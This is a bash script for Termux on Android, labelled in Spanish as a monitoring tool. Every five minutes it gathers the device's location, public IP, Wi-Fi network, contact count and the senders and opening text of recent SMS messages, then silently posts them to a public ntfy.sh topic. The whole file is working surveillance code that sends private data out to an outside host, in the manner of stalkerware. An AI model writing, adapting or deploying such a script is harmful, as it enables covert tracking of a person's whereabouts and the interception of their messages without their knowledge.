#!/bin/bash
# Script de Monitoreo Optimizado - Todos los datos en un solo mensaje

# ===== CONFIGURACIÓN =====
NTFY_URL="https://ntfy.sh/3kG4epWMkei6KLLq"
INTERVALO=300  # 5 minutos entre actualizaciones
DEBUG=true

# ===== FUNCIONES OPTIMIZADAS =====
enviar_ntfy() {
    curl -sS -m 10 -H "Priority: high" -d "$1" "$NTFY_URL" >/dev/null 2>&1
    [ "$DEBUG" = true ] && echo "✔ Datos enviados" || true
}

obtener_datos() {
    # Dispositivo
    local modelo=$(getprop ro.product.model)
    local android=$(getprop ro.build.version.release)
    
    # Batería
    local bat=$(termux-battery-status 2>/dev/null)
    local bateria=$(echo "$bat" | jq -r '"\(.percentage)% (\(.status))"')
    
    # Red
    local ip=$(curl -sS ifconfig.me)
    local red=$(termux-wifi-connectioninfo 2>/dev/null)
    local wifi=$(echo "$red" | jq -r '.ssid // "Cellular"')
    
    # Ubicación (modo rápido)
    local loc=$(termux-location -p network 2>/dev/null)
    local ubicacion=$(echo "$loc" | jq -r '"\(.latitude),\(.longitude) (Prec: \(.accuracy)m)"' 2>/dev/null)
    
    # Contactos (resumido)
    local contactos=$(termux-contact-list 2>/dev/null | jq -r 'length')
    
    # SMS recientes
    local sms=$(termux-sms-list -l 3 2>/dev/null | jq -r '.[] | "\(.sender): \(.body[0:30])..."' | paste -sd '\n' -)
    
    # Construir mensaje consolidado
    local mensaje="📊 MONITOR COMPACTO 📊
    
📱 Dispositivo: $modelo (Android $android)
🔋 Batería: $bateria
🌐 Red: $wifi | IP: $ip
📍 Ubicación: ${ubicacion:-No disponible}
    
📞 Contactos: $contactos
📩 Últimos SMS:
${sms:-No nuevos}
    
🔄 Actualizado: $(date '+%d/%m/%Y %H:%M:%S')"

    echo "$mensaje"
}

# ===== EJECUCIÓN PRINCIPAL =====
main() {
    # Verificar dependencias básicas
    for cmd in termux-api jq curl; do
        if ! command -v $cmd >/dev/null; then
            pkg install -y $cmd >/dev/null 2>&1
        fi
    done

    while true; do
        enviar_ntfy "$(obtener_datos)"
        sleep $INTERVALO
    done
}

main
